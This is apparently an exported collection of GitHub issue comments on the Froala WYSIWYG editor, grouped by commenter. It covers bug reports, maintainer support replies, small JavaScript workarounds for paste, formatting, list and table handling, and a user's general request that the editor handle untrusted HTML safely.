to update your Froala Editor to the latest version 2.7.2, although this will most likely not solve this issue.. @wdc-admin Is this issue still happening for you with the latest version of the Froala Editor? Do you have any additional information to help us reproduce it at our end?\nI'm closing this issue for the moment due to lack of response. We'll reopen it once we have enough details to reproduce it.. Closing this in favor of #2333 . @cmkind do you have any updates regarding this?. @cokuna-pavelkosolapov if you don't want to allow any HTML tags in the editor, besides setting the htmlAllowedTags to an empty array, you should also configure the editor so that the user will not be able to enter any HTML tags in it.\nFor example, there is no reason for having the Bold button is the toolbar, which inserts STRONG tags. It is true that you can also insert bold by keyboard, but this can also be disabled. You just have to change the shortcutsEnabled option: https://www.froala.com/wysiwyg-editor/docs/options#shortcutsEnabled. @electroheadfx we are not able to reproduce this issue. Since it works fine on the Froala website, could you please make a JSFiddle where we could see the problem?. @javeriaanwer does this happen on our website too?\nBy default Firefox makes the background of the selected text always blue, no matter what background color (dark or light) the text has. It is possible that you have some CSS rules that are causing this.. Font size is applied inline to the selected text. Selecting an option from Paragraph Format (i.e. Heading 1) will change the paragraph type form a P tag to a H1 tag, but will not remove the existing inline style. This is the intended behavior, and it is the way text editors usually work. If you want to remove the inline style you have to use clear formatting.. Text formatting refers to CSS properties set on the selected text. It is not meant to change the paragraph format. To achieve this, you could either change the current implementation for the Clear Formatting button or create a custom button.. Reopening this issues as it is still happening in the basic editor when iframe is true: https://jsfiddle.net/jfgqk3uL/. @ashwini0529 Google Docs uses inline style for superscript/subscript formatted text. By default, the editor does not keep the style attribute on paste. You can change this behavior using the pasteDeniedAttrs option: https://www.froala.com/wysiwyg-editor/docs/options#pasteDeniedAttrs.. @ashwini0529 Please make sure that you are using the latest editor version from GitHub, when trying pasteDeniedAttrs option.. The value for the pluginsEnabled option has to be an array with the plugins you want to include, where [] means no plugins and ['image', 'link'] means only the image and link plugins.\nThe default value for the pluginsEnabled option is null. This means that there is no value specified for the option and when a plugin's JS file is included (e.g. quick_insert.min.js), the plugin is automatically turned on.\nIf you don't want the Quick Insert plugin you can either not include the plugin's file, or exclude it from the array pasted to the pluginsEnabled option.. This happens because you are using the editor incorrectly. Please reach us through our contact page, specifying the options you pass during initialization, to help you out with this.. Usually the alt key is used to access menus and navigate through them. Unfortunately, IE makes it impossible to use the alt key in javascript. \nYou are saying that, when having the Insert Link toolbar button focused, pressing enter will cause the popup to flicker. But how are getting the focus on the Insert Link toolbar button?. @docikaci we are not able to reproduce this. The link from where you are copying requires authentication. Otherwise, we have to build ourselves the same layout you have in that other editor. This is quite impossible for us, because we don't understand the language and the menu items doesn't seem to be the same.\nCould you please create a jsfiddle with the content copied form the other editor already in the Froala editor?. This is a blockquote. How is this related to copying from the other editor?. This fix is going to be included in the next release which we'll make in the following days or next week.. @chrisdeeming this is actually not an issue with the editor, but with the website you are copying from. The content that is copied from the website to clipboard does not have spaces. Wherever you would paste that content to it will behave exactly the same as it does in the Froala Editor. You could also try pasting into an email client, Google docs or Notes.. @anlumo we were not able to reproduce this issue. Neither on this repo nor on the ember one. We tried both Windows and MacOS. Could you please test and let us know if the error is present here: http://www.emberwysiwygeditor.com/?. This might be a duplicate of #2491. Could you please paste the same content in Google Docs or any other place other than Outlook or the Froala Editor and let us know if it is pasted correctly or if it looks exactly the same as it is in the Froala Editor?. @kishore12 you are using an older version of the editor. Please update to the latest, which is 2.7.3. Also, the Froala editor requires jQuery 1.11.0 or higher and you are using 1.7.1.. @BodhiMax could you please give us the exact content you are pasting?\nIn Code View, we tried pasting HTML code with an A tag having the href value formatted like you said, but it isn't emptied out when switching back to text and then again to Code View.. Thanks for your example. This issue is no longer happening with the latest updates from the master branch of this repo.. @RonnyTh this issue is already fixed on the master branch of this repo. The fix will be included in the next release, and then we will also update the editor version on our website.. @connect-technologies thanks for pointing this out.. This should be fixed on the master branch of this repo. @largeden, could you please test and let us know if everything is okay?. @dragokas we don't really understand Russian, is this the window you are talking about?\n. First of all, this window is not part of the Froala Editor. There probably is an issue with the code you have for it that is not related to the editor.\nSecondly, we just tested this in Windows 7, Opera 50 (the latest version) and it is working okay. We are only supporting the current last version of Opera and the one before it. Here is a list with supported browsers for the Froala Editor: https://www.wired.com/2013/02/presto-is-dead-long-live-opera/.\nWe strongly recommend you to upgrade your browser especially because Opera dumped Presto 5 years ago (https://www.wired.com/2013/02/presto-is-dead-long-live-opera/) and it seems that the latest Presto update was 3 years ago.. Forgot to mention: if the window that is not closing is from the xenForo software, then you should contact them.. @divdax can this issue be reproduced on our website?\n. The warning doesn't change in any way how the editor works and behaves. It makes it possible to test all the editor's features before actually purchasing a license and it can only be removed after the purchase.. @divdax the options that you have in the paragraph styles are only for demo purposes and that's why they are not translated. The values that are there by default are just an example of how the plugin works and what can be done with it.\nNormally, you should define your own styles (that integrate with your website's design) and replace the defaults with your custom ones.\nAnother example would be the inline style plugin. For demo purposes, the default values are Big Red and Small Blue. I assume you are not going to use those.. @chrisdeeming How old the Apple devices should actually be? We tested on iPhone 6S with iOS 11 and on iPad Air 2 with iOS 11 (initially launched with iOS8) and it seems to be working just perfect on our website.\nWe also made some changes to the backspace, so we might have some improvements for this in 2.7.4.. Yes, they are, please test the master version if you can.\nYou could also try some tips from the Apple forum that might help you speed up the device: https://discussions.apple.com/message/30293501#30293501. Thanks @ngem for your suggestion. We can't however reproduce the issue that you are having. We've set useClasses: false, but the emoticons are still showing. What os and browser are you using. Could you make a jsfiddle where the issue can be reproduced?. @wrporter this is already fixed in the latest version from the master branch of this repo.. Doesn't seem to happen in 2.7.5. Are you sure you updated the editor?. @BrianLaughlan we want all the editor popups to have a unitary feel that is consistent with the editor. For this reason we consider that all .fr-popup elements should have the same style: border, shadow, margins, colors and text formatting.\nFor more granular styling, each popup has a specific template that includes classes for each element inside it. We recommend styling either all .fr-popup elements or the content inside each of the .fr-popup elements, like for example fr-link-insert-layer.. A better approach for what you need is to use the popups.show event. I just notice that it is currently not documented on our website, but it is similar with the hide event (https://www.froala.com/wysiwyg-editor/docs/events#popups.hide.[id]).\nIndeed, adding a class will not break anything, but we are doing our best to keep the plugin's size as small as possible. I'm going to mark this as a feature-request and if there are more users asking for such classes we will consider adding them in the future.\nEven if  we add classes for popups, we wouldn't recommend setting the popup's position using CSS, because the position has to change along with the scroll. Therefore it is better to do this in Javascript.\n. We made some changes to the image plugin lately that will be included in the next release 2.7.4. We tested this issue on the latest editor version and it doesn't happen. Please update your editor version once we make the release and give it another try.\nI'm closing this issue for now, but if your problem still persists, please make a jsfiddle where we can reproduce it.. The pluginsEnabled option specifies which plugins should be enabled in the editor instance. By passing pluginsEnabled: ['aviary'], you basically tell the editor to enable only the aviary plugin. Buttons from plugins that are disabled will not be displayed in the editor's toolbar.. By default all plugins are enabled. Therefore, if you are using all of them you could simply not use the pluginsEnabled option.. The fix for issue #2765 reverts the change that addresses this issue. \nUnfortunately the fix we initially found for this causes real problems in other places. Since this issue is more the way IE renders the code than an actual issue it will remain a wontfix.. @coolrecep can you also reproduce this on our website? Or could you please create a jsFiddle where we can see this happening?. Thanks for your confirmation. If it works okay on our website then it means that the issue is not from the editor, but from the way it is integrated. For technical support, please contact us thorough out website: https://www.froala.com/wysiwyg-editor/contact. The video requires a wrapper that prevents further clicking and writing inside the same table cell. We currently don't have a way to keep the current video functionality and also allow placing the video in a table cell and still permit writing in the same table cell.. Thanks for pointing this out. We have investigate it a bit further and it seems that this is a CSS problem caused by the combination of the following 2 properties:\nvertical-align: bottom;\nposition: relative;\nHere is a jsFiddle with a basic contenteditable=\"true\" example where the problem can be replicated.\nposition: relative; is required in order to have the resize handlers and vertical-align: bottom; is used for design purposes, otherwise the image will not appear vertically centered - it will appear to have more bottom margin.. Hi there!\nAdjusting the width of a table column will automatically adjust the width of the column next to it. This means that adjusting the width of the last column will also adjust the with of the column next to it. For this you would have to use the border that is between the columns that you want to adjust.\nUsing the table's external borders will result in adjusting the width of the entire table. Since the width of all columns in a table are by default expressed in percent, by adjusting the table with, all columns will adapt to the new width.\nPlease see the following recording for a demonstration: https://www.dropbox.com/s/1uf9dnm94hv3fqs/Screen%20Recording%202018-11-09%20at%2016.29.18.mov?dl=0\nAs for your second question, I am not sure I understand what you mean. Could you please make a recording for it? Thanks!\n. Thanks for pointing this out @largeden. It's fixed now.. ",

    "kungfutse": "I've hacked through this same need (need to clean up word generated html mess without losing all the stylings) myself by using the afterPasteCallback and get/setHtml, but it is a rather ugly way to do it and it messes up caret positions in some cases. \nOne good solution for this would be to allow beforePasteCallback to actually change the content that will be inserted to the editor. Then  you could do your own cleanup / html tag validation for the content using e.g jQuery.htmlClean plugin.\nAnyways, great editor and like for us as well we basically had two options for a new light weight editor to replace the aging WYMeditor and Froala was chosen primarily because we could play around and try it before purchasing a license to determine if it suited our needs.\n. You can already do this with CSS using max-height.\nThe HTML and wysiwyg views have different paddings, hence the different max heights.\n.froala-element {\n    max-height: 500px;\n}\n.f-html .froala-element {\n   max-height: 520px;\n}\n.

However, it is quite apparent from us debugging through Froala that the above event listener ends up triggering the closeImageMode() function when the if condition is not met. The closeImageMode() function in turn ends up enabling contentEditable attribute on line 2485.\n\nI suspect that you may want to look changing else condition to an else if to stop the code from executing every time there is a mouseup event fired anywhere within the host application.\nLet me know if that helps.\n. Great, thank you\n. Thank you that alteration has fixed the problem i was having.\nIf you were to unbind the specific function rather than all mouseup events it would probably be somewhat cleaner. \nThanks again\n. was this implemented in the 1.1.4 version?\n. it seems to be the '**' used on the .off() as the event above is non-delegated.\nFrom jquery.com:\nTo remove all delegated events from an element without removing non-delegated events, use the special value \"**\".\n.

I'm going to use this approach. Thank you for the workaround!\n. OK, thank you. In our case it works that way because we use single editor for many contexts.

    "rwaters71": "Thanks for working on this Stefan !\nAlso, further to this, once you make any change in html mode and switch back to wysiwyg, it is very hard to get the cursor to focus in the textarea.  (only happens if you actually focus in the html mode textarea, or make any change in html mode). \n. The secondary smaller problem (no cursor or focus after html-mode edit) only seems to affect Internet Explorer  (version 11, Windows 7 Ultimate x64 in my case). It does not affect Firefox 30 or Chrome. The original issue seems browser-independent.\n. Thanks for the improvements Stefan!\n1) It is sometimes necessary (for me) to edit HTML directly. I believe that an editor in HTML mode should behave similarly to a plain textarea, i.e. it should save changes that the user makes. All other editors I have used seem to behave this way. \nWith the current Froala version (as of today), if I edit code directly, even after going back to WYSIWYG mode, not all changes are being saved. For example, if I have added an image, in HTML mode the tag is of the type:  <img ...   src=\"/images/123.jpg\">, even after changing the contents of the src=\"...\", the changes are not being saved (regardless of whether you switch back to WYSIWYG mode or not). Only changes to style/alt/class are saved, and only if I switch back to WYSIWYG mode, which is somewhat counterintuitive.  What If I was to paste a block of html code, I can't be sure of what will save this way.\nYou are correct that it is more common to save after you see the results in WYSIWYG mode. However, if you have a form with textarea (Froala) and submit button, users would expect the contents to save if they submit the form without regard for the current editor mode. It is counterintuitive not to save the changes that have been made if the user submits the form.\n2) This seems fixed, thank you! I'll do some more testing, but it seems to behave well (the extra classes f-img-wrap, f-link, etc. are not added anymore).\n. Stefan,\nOn the image tag, if I edit the src=.... in html mode, the changes are not being saved for me, even after changing back to wysiwyg before submitting the form.\nIdeally I would like to also be able to save in html mode (without Froala interpreting/changing the html input), that would prevent/mitigate any possible future peculiarities.\n. In my case (Froala as textarea with submit button): after you edit the img src, the image seems to change as per your video (you see the new image in wysiwyg mode), however, after submitting the form the change is not reflected for some reason (the old url is being saved, other text changes are not being saved). This is after switching back to wysiwyg mode and clicking submit, as per your suggestion, and seems browser independent.\n. After a bit further investigation, seems my problem may be related to \"afterRemoveImageCallback: function ($img)\" - switching to html mode with an image in the area throws an error:\nTypeError: $img.attr is not a function\nthis.options.imageDeleteParams = {src: $img.attr('src')};\n. Latest one from Github (1.1.8?)\n. Thank you Stefan!\n. I am also experiencing this. It seems to only affect some longer content (more formatting ?)\nIt does not happen if you just use arrow keys.\nHitting backspace twice (when it happens) exits out of the page and goes to the previous page (page history)\n. I agree we should use CSS and HTML5.\nHowever, imho the editor should degrade gracefully instead of just breaking when editing older code that was not necessarily created in froala.\n. With all due respect, IMHO it seems like unnecessary excessive css clutter to add the same class to all block elements instead of defining styles globally. If you have an article with 100 block elements it does not make sense to add the same class 100 times to all of them, or, generally, for an editor to add classes that the user did not intend.. Just my 2c.\nIs there an option for the user to disable this, or do I have to post-process the html code ?\n. Apply classes globally to both pages via external css... Or wrap content in a div,, but, in both cases you can easily do it without the editor mucking the html without user input. \nIMHO global styling is outside the scope of an editor, and it keeps the code much cleaner.\nIn my case, I am testing the editor in a custom CMS for my own use, where the content (edited by Froala on a textarea) is completely separate from the pages where it is displayed. Many implementations try to separate styling from content, not combine them. What if you want to display the same content on different pages, styled differently (for different devices, different themes, print-view, etc.) ?  That is only possible if you separate content from styling. \nThanks for listening, the quick replies and a great editor.\n. I understand.. Still, adding extra classes to each html element just seems to limit user flexibility.\nIf you must style everything, a wrapper div around the textarea, and on pages where edited content is shown sounds like a better idea and would keep the code much cleaner/smaller/faster (without the need for 100s of class definitions on every block element), just my opinion.\nAlternatively, it may be useful to allow users to turn this on/off globally, or choose what classes to add/keep on block elements when saving.\n. Thank you for the getHTML event.\nJust for completeness, there are also other classes that may have to be removed one by one, i.e. \"fr-fil\" \"fr-fin\" (for images), etc.\n. Thank you !\n. I have a custom button that inserts html, something like:\ninsertCodeP:{\n    title: 'insert img thumbnail code',\n    icon: {type: \"font\", value: \"fa fa-language\" },\n    callback: function () {\n        this.insertHTML('<a class=\"piframe\" href=\"/_iframe_showpic.php?img=/images/.....\" rel=\"sg-set\"><img src=\"/img.php?x=100&img=/images/.....\" alt=\"\" title=\"Click to expand\" width=\"100\" class=\"piframe-left;\"></a>');\n        this.sync(); // Save HTML in undo stack.\n    }\n}\nWhen saved, the editor adds an extra froala class to the img element, i.e. \"fr-fin\" I believe, separated by a semicolon from the first class, resulting in class=\"piframe-left; fr-fin\".\nAfter that, if you change the image left/right positioning in the editor the problem is fixed, I believe.\n. Using version 1.2.5 downloaded 2014-12-11, it is browser independent (IE11 and Chrome ).\n1)  If you have three paragraphs with text --> select/highlight --> choose [code], there are three separate <pre> blocks created (should be only one block?)\n2) If you have text separated by line feeds only (SHIFT+ENTER), it is entered into a single [code] block ok and it seems to save ok. However, if you ever edit again, and switch between html/wysiwyg mode the line feeds are lost and what remains is a single long line in a <pre> element.\n. Line breaks in <pre> blocks are not retained after saving in 1.2.7 for me... Seems that everything in the block is put into a single line after saving.\n. Actually, in newer versions the CRLF line breaks are saved correctly. They are also shown correctly while editing (if you insert <pre> element with breaks in the current editor). \nHowever, the issue occurs if you open saved content. if you open saved code with line breaks wrapped in a <pre>, all line breaks are collapsed into (and displayed as) a single line by Froala. The html source of the page shows the line breaks, but not the editor. The editor html view does not retain/show the line breaks. This only occurs if you open code saved previously, so I don't think a jsfiddle can display it, and we (obviously) can't save content on the official editor page.\nA simple test would be to save, this, and then try to edit it again:\n<pre>line1\nline2\nline3\nline4</pre>\nThe first time you create/paste this code in editor it appears correctly as above. However, after saving, when you open it in Froala the next time, it appears as:\n<pre>line1line2line3line4</pre>\n(even though the page source has the line breaks)\n\nAny consecutive save does not retain any of the line breaks.\n. Ah, you are right that it does not do it with all content. Any paste from vBulletin posts (any paragraph) would do it:  http://hardforum.com/showthread.php?t=1858181\nWraps it in a table and adds comments inside the td element: <!--StartFragment--> ... <!--EndFragment-->\nSeems that it depends on the source site.

    "beyondcreed": "Just curious has this ever been fixed so you can actually save in HTML source view instead of flipping back to rendered view and saving? Right now it's sort of a bad UX to have save button disabled for HTML source view and forcing them to switch to rendered view before saving. If you look at other editors out there, textangular, summernote, tinymce or cms systems using html editors like wordpress, drupal, etc. they all allow user to save data while sitting inside HTML source view. I understand you wanna enforce filters/transforms on the data so editor can parse it out correctly and render, but wouldn't it make more sense to somehow be able to bind these routines while editing in HTML source view. That way when save button is clicked you could simply run the filtering/transform on the content in the text area and correct what needs to be corrected thus allowing the capture/save without having to flip between the two. Alternatively maybe a simpler solution would be to have a config switch/toggle (so you can maintain backward compatibility) that allows data capture/save (i.e. override switch) and then editor can simply fetch content back and filter it when either: 1. page is fully loaded or 2. flipped between the modes (source to render). Most of the times server side implements sanitization/filtering process as you cannot rely on client to handle this due to security concerns. Right now it would appear that the only sane way to get around this restriction is to have separate text area not connected to editor where raw source is shown and then another button where editor can only display rendered mode if such button is clicked, these could then be kept in sync somehow via backend. It's either this or hacking the core to allow data capture at raw source level.\n. ",

Cool, and how's 1.1.8 going? Are we close to releasing it? 'cause I'm holding back with deployment a bit as 1.1.8 seems to be fixing some of the issues we've encountered.\n. Ok, by \"because it will be triggered when it's not necessary\" you mean that's going to be fired even if content hasn't changed, is that it?\nRegarding callbacks - they're useful, but aren't good enough for when you write your own plugins that suppose to make use of them. By definition there can be just one callback for each \"event', so by design it's limited. Unless I'm not aware of better way of hooking into your event / callback architecture.\n. For instance there's initializedCallback (btw undocumented I think). I'd like my plugin to react to that event, as well as I'd like to leave potential developers intact way of attaching their own callback for that. With current design it's impossible. \nNo to mention situations where I need two plugins reacting to some event - again, can't be done.\n. Brilliant. Looking forward for the release.\n. Cool, looking forward to that feature.\n. It seems that version 1.2.1 has the same problem again.\n. Hmm, works on 1.2.2 anyway, don't know what was it then. Good thing it works now.\n. A bit better now, but now there's no event when leaving html view - I think there should be (for consistency) - am I right?\nhttp://jsfiddle.net/jdp83ux9/1/\n.

In that case shouldn't the \"Open link\" button be hidden (or disabled) until insert is made?\n. Brilliant\n. Chrome 36, ubuntu\n. Fine with me - just another 5 lines and button is there, I was suggesting this thinking more about people that are not that into extending froala, but find some functionality lacking.\nMaybe you guys should have a place for snippets like this? Or add this as a plugin?\n$.Editable.commands = $.extend($.Editable.commands, {\n    removeFormat: {\n      title: 'Clear formatting',\n      icon: 'fa fa-eraser',\n      activeless: true,\n      callback: function (cmd, val) {\n          this.removeFormat();\n      },\n      undo: true\n    }\n});\n. Right - I made it public now - sorry for that.\n. Ah, perfect.\n. Any rough timeline for resolving this? We're holding with releasing to production until this one is taken care of.\n. I'm glad someone already raised this issue (less typing for me ;) ).\nI just fixed it locally as I need to upgrade to latest version and maintain ability to remove contenteditable=false blocks.\nI hope you can excuse screenshot with git diff from non-minified source (not saying this is a great fix, but for now it will do me fine until this is properly addressed by the Froala team; being able to remove non-editable blocks shouldn't be an enhancement, in my mind this is obvious bug; but I digress..):\n\n. @stefanneculai Got ya.

Also a note that this worked in v2.3.4. @JordanAtIgloo Thanks for the heads up! . @anthonyborell \nI fixed it locally with the following code in applyStyle after the check where it's looking up at the parent node to try to merge:\n```\nvar tmp = editor.node.contents( $span.get( 0 ) );\nvar contents = [ ];\nfor ( var i = 0, len = tmp.length; i < len; i++ ) {\n    if ( editor.node.hasClass( tmp[ i ], 'fr-marker' ) !== true ) {\n        contents.push( tmp[ i ])\n    }\n}\n$span.get( 0 ).normalize( );\nif ( contents.length === 1 && $( contents[ 0 ] ).is( 'span' ) === true ) {\n    var $child = $( contents[ 0 ] );\n    $child.css( prop, val );\n    $span.replaceWith( tmp );\n    $span = $child;\n}\n```\nEdit Feb 2, 2017\nChanged editor.node.hasClass( tmp[ i ], 'fr-marker' ) === false to editor.node.hasClass( tmp[ i ], 'fr-marker' ) !== true because hasClass doesn't return a boolean false for text nodes. @stefanneculai Sorry, yes - and edit.isDisabled( ) returns true. Instead of creating a new ticket, here's an example of behaviour that arises from this bug (using the editor at froala.com)\nWhen the list items are being added above the nested list, I'm pressing enter where you can see the cursor.\nI also press backspace several times but it has no effect\n\n. I made a local fix for this in _processNodeFormat,\nChange\nwhile (node && !$(node).is('.fr-marker') && $(node).find('.fr-marker').length == 0) {\nTo\nwhile ( node && !$( node ).is( '.fr-marker, a, ul, ol, li' ) && $( node ).find( '.fr-marker' ).length == 0 ) {\nAnd \nelse if ($(node).find('.fr-marker').length) {\nTo\nelse if ($(node).find('.fr-marker').length || $( node ).is( 'a, ul, ol, li' )) {\nThis fix also addressed #1739 . @stefanneculai Just got around to testing this in 2.5.0 & it looks like it's still an issue\nThe steps are fairly similar, just need to have another element in the editor as well (I was triggering with an additional empty <p> tag)\n<ul><li>test<ul><li>test</li></ul></li></ul><p><br></p> Use that as the editor content & try cmd+a then apply a style\n. @stefanneculai editor.keys._mapKeyUp Makes several checks for e.which == $.FE.KEYCODE.ENTER that are always false because it's also not triggered for the enter key. Another issue I noticed that might be related, let me know if I should make a separate ticket for this one:\nWhat I'm trying to do is programmatically put the selection around a table so if the user does any keyboard input, the table will be removed. I have that working properly, but when the user enters keyboard input, every row except the first and last are being removed (in all browsers).\nAm I doing something wrong or is there a bug in editor.selection.remove( )?\nHere's some code example\n```\n// Assume we were given table\neditor.selection.clear( );\nvar id = Date.now( );\nvar start = $( $.FE.START_MARKER );\nvar end = $( $.FE.END_MARKER );\n// Make sure ids match for selection.restore\nstart.data( 'id', timestamp );\nend.data( 'id', timestamp );\nstart[ 0 ].setAttribute( 'data-id', timestamp );\nend[ 0 ].setAttribute( 'data-id', timestamp );\ntable.before( start );\ntable.after( end );\neditor.selection.restore( );\n```\nThen pressing delete/etc\n. @florinpopescu Thanks for the info! Any thoughts on why my second snippet wouldn't be working? It seems to delete the majority of the table but leaves the first & last rows in the editor box. @stefanneculai That specific issue seems to happen in both Chrome & Safari as well. Sure thing! https://jsfiddle.net/y7t1174d/1/ \nClick the icon in the toolbar which runs the code I had above - then when you use keyboard input it seems to delete every row in the table except the first/last and then puts your cursor in the first cell\nEdit: I incorrectly said the header/footer wasn't being deleted - I meant the first/last rows. @stefanneculai Was there anything you could see in the jsFiddle I shared?. @stefanneculai Swinging back around to this, I was able track it down finally to the selection._processNodeDelete method\nIn my case, it was the initial if that was getting tripped up for td/th cells: editor.node.hasClass(contents[0], 'fr-marker') was returning false because there's nested nodes.\nI modifed this check: \n// Node is TD or TH.\nif (['TD', 'TH'].indexOf($node.get(0).tagName) >= 0 && $node.find('.fr-marker').length == 1 && editor.node.hasClass(contents[0], 'fr-marker')) {\n   $node.attr('data-del-cell', true);\n}\nto instead read:\n```\nif (['TD', 'TH'].indexOf($node.get(0).tagName) >= 0 && $node.find('.fr-marker').length == 1 ) {\n    var marker = $node.find( '.fr-marker' ).get( 0 );\nif ( $node.is( ':first-child' ) === true ) {\n    while ( marker !== null && $node.is( marker ) === false ) {\n        marker = marker.parentNode;\n\n        if ( marker.previousSibling !== null ) {\n            marker = null;\n        }\n    }\n}\nelse if ( $node.is( ':last-child' ) === true ) {\n    while ( marker !== null && $node.is( marker ) === false ) {\n        marker = marker.parentNode;\n\n        if ( marker.nextSibling !== null ) {\n            marker = null;\n        }\n    }\n}\nelse {\n    marker = null;\n}\n\nif ( $node.is( marker ) === true ) {\n    $node.attr( 'data-del-cell', true );\n}\n\n}\n```\nWhich seems to fix it by accounting for nested nodes in the th/td & catches the last cell marker. @stefanneculai No problem! I am, just updated my fiddle to pull the latest version: https://jsfiddle.net/y7t1174d/2/. The fix for this seems to have some unintended consequences, it's deleting block-level nodes as you backspace inside them:\n\n@stefanneculai . \ud83d\udc4d Noticed this with the latest release as well!.

    "kenxle": "Thanks for the quick response. The reason that I logged an issue is because this does not trigger an autosave, including the code you have written. \n. Ok. I assumed contentChanged was setting some sort of dirty flag, and that autosave would check the dirty flag instead of the content itself. \nIf this is not the current method, please consider this a feature request: contentChanged event becomes part of autosave chain. \nSo keypress triggers contentChanged, contentChanged sets dirty flag, autosave checks dirty flag instead of content.\nThis becomes important if you want autosave to include any metadata that may change but is not written in the body of the content.  \nThanks!\nKen\n. No, not meta tags. \nI have additional fields that describe the note. Things like gmail's tags. \nThey are user inputs that get serialized and submitted with the autosave. But when they change, I can't tell the note that it is in a changed/dirty state. I have to implement my own immediate or delayed saving, and make sure that it doesn't conflict (or cause race conditions with) the note autosave. I'd like to be able to tap into the functionality that already exists for the note. \n. Confirmed. Working as expected. This is a big help. Thanks!\n. It looks like this functions slightly differently than the autosave. Autosave appears to be triggered\n1) after typing content has stopped\n2) after autosave interval has elapsed\nFor the regular content, it looks like you might have a timer or something that gets reset each time a keystroke is made. This makes it not autosave if the user is continually typing. It instead waits for a typing break, then the autosaveInterval, then it triggers the save. \nFor setDirty, however it appears to trigger only\n1) after saveDirty is called any time\n2) after autosave interval has elapsed\nIf you continue to call saveDirty on every keypress, it will continue to save every saveInterval. It does not wait for saveDirty to stop being called before running the timer. This means that using saveDirty will cause the editor to save every saveInterval, even when new content is being continually added. \nThis is a very small issue, but I wanted to note the difference. \nThanks again for the great work!\n. @designbyadrian, I don't need it to save after every keystroke. That would be too many requests. I want it to wait until the keystrokes stop, wait 5 seconds (saveInterval), then save. This seems to be how the normal autosave with typing works. \n. ",

It should be very easy to use Froala as a very lightweight editor for simple markup without adding clunk to the source. I appreciate the workaround provided in getHTML.html but IMO this shouldn't be necessary, or at least it should be a simple init option rather than having to do a much (slower) removal of all classes via jQuery on each instance of getHTML.\n. :+1: Would definitely consider using this feature. I think it does make sense for certain UI widgets. Gmail does this.\n. Cool, thanks for the quick fix. I'm not too sure why this should be an option (and disabled by default) though - seems like nobody would want the bug I'm describing to happen.\n. Do you have a starter jsfiddle with the basic dependencies in place that I can fork?\n. Here ya go http://jsfiddle.net/philfreo/7eu9190a/1/\n. Cool, thanks!\n. @stefanneculai Actually there's a problem. Everything works great in inline mode but there's a problem with the \"Insert Link\" popover in non-inline mode. On master, if you take examples/scrollable_container.html and set inlineMode: false then the \"Insert Link\" popover appears wrong with and without scrollableContainer set.\n. Sorry, but it's still broken for inlineMode: false.\n- Change examples/scrollable_container.html to be inlineMode: false\n- Scroll down in the scrollable a little bit first, as much as you can while still seeing the toolbar.\n- Click the Insert Link or Insert Image buttons\n- The popups appear in the wrong place.\n. Works great now, thanks! :+1: \n. :+1: \n. Yes. The jsfiddle I provided links straight from master also.\n. :+1: \n. Thanks for pointing that out (hadn't noticed it yet) however that doesn't fix the issue that I'm referring to. That allows you to tab out of the editor but my jsfiddle above was trying to show that you should be able to tab in to an editor by pressing tab once from the previous input.\nI'm guessing the issue is that currently every toolbar button is taking up a position in the tab order so to tab from the \"Your address\" to \"Your bio\" in the jsfiddle takes pressing tab 3 times instead of 1 time.\nLikely by default, but at least with an option, you should be able to exclude all the toolbar buttons, etc. from tab index so that you can tab into the froala editor from the previous form field, just like you would be able to with any other input or textarea.\n. It's also a problem in Safari.\n. :+1: \n. It skips all the toolbar buttons -- except not the custom dropdown button. Can you fix this?\n. :+1: \n. :+1: \n. :+1: :tada: \n. safari & chrome at least\n. :+1: \n. Thanks, sorry I thought I looked through all the options but apparently not :/\n. This is way better than before now ( :+1: ) but I think there's a minor issue still.\nWhen following the instructions above but pasting multiple times in a row instead of a single time -- the cursor appears on the next line however the pasted content is appearing above.\n\nOr maybe another way of saying it -- when pasting a single word from TextEdit the cursor appears on the following line and it shouldn't.\n. There's also a problem where the whitespace lines are duplicated. So if you paste this from a rich text mode of TextEdit:\n\nHi there\nGoodbye\n\nThen you'll get two blank lines (plus the cursor problem)\n\n. :+1: \nWhen pasting the rich text now it's introducing <p> tags into the editor with paragraphy: false. I don't really mind this (I'm assuming TextEdit itself is copying <p> tags so Froala is keeping it), but just wanted to bring it up in case you missed it.\n. :+1: \n. I think this bug was introduced in only the latest commit cf0cfe2b0ff19edb5fdf2ed559a2df9fb8fa6b81\n. Thanks!!\nLooks like Control-k is still masked though.\n. \nHere's what I get in Safari\n. https://www.dropbox.com/s/i9vm6v5bvr1ewsf/list%20bug.mov?dl=0\nSafari 8.0.2 on Yosemite\n. Oh, not positive exactly how. Might have involved pasting from website content. Regardless, would be nice if the list bit was fixed. \n. Hmm, I'm not seeing the fc931e9 commit that closes this anywhere?\n. I'm assuming the usage is like:\nlinkAutoPrefix: 'http://'\nAdding this option breaks mailto: links.\n. :+1: \n. > You should use trackScroll option if you want not to hide the dropdowns when you scroll.\nThanks for the update, I'll try it out. An option is certainly easy for me to add, but I have to wonder why you'd introduce new options versus just having the default experience be what seems to have the best UX\n. Okay, got it, thanks\n. trackScroll: true did not fix the problem I described.\n. Ah, yes... indeed most of the content is in a div with overflow: scroll and I'm using the scrollableContainer option\n. >  For the window we are setting a timer on scroll and if the timer is set...\nRather than setting this on window always, what about just setting it on scrollableContainer ?\n. Sure but that's a very easy case to detect & handle. The point is that you always know which element to bind to and then it should work. \n. still breaks as soon as you enter HTML mode\n\n:(\n. We're using Froala as an html email compose tool, and when replying to an existing HTML message it may contain crap like this from Outlook-generated emails, etc and we blockquote the previous message. I know blockquoting an <html> tag, etc. isn't technically valid HTML, but generally it works just fine and I expected Froala's cleanup code to gracefully handle cases like this. \n(The example in the jsfiddle isn't the entire HTML, but I narrowed it down to this bit of code which breaks things)\n. http://jsfiddle.net/axpq8eu2/\nClick the button and notice how the styles on the rest of the page get messed up\n. My basic assumption is:\nA froala editor should be able to be passed any (potentially untrusted) input content* and a) not choke on the content, b) be safe for the user / prevents XSS, c) doesn't affect anything outside of the editor\n*(It doesn't have to continue to keep/maintain garbage input html - it can clean it up if it wants, but it just can't choke on it)\nIs there an option to make Froala use an iframe, if that's what's necessary to satisfy (c)?\n. Very helpful, thanks. I'll remove <style> from allowedTags and turn off allowComments (even though I don't think this should be necessary). I'm glad you're changing the default though - probably the safest for everyone as a default. \n. Another similar case is still breaking it:\nhttp://jsfiddle.net/91ekzse5/\n. Any ideas?\n. Should I upgrade now?\n. Thanks!\n. Hey @stefanneculai I noticed that https://froala.com/wysiwyg-editor/docs/options#allowedTags still shows style in the default list of allowedTags. Is this an error in the documentation or what? (You mentioned above removing it from the default list).\nAlso, I noticed that base can be used for some pretty nasty stuff (changing the location of AJAX requests on the page). Maybe you want to remove that from the default list as well?\n. You might want to use something like Premailer \nhttp://premailer.dialect.ca\nhttps://github.com/premailer/premailer\n. I'm using Froala for html email also, though I haven't yet cared about 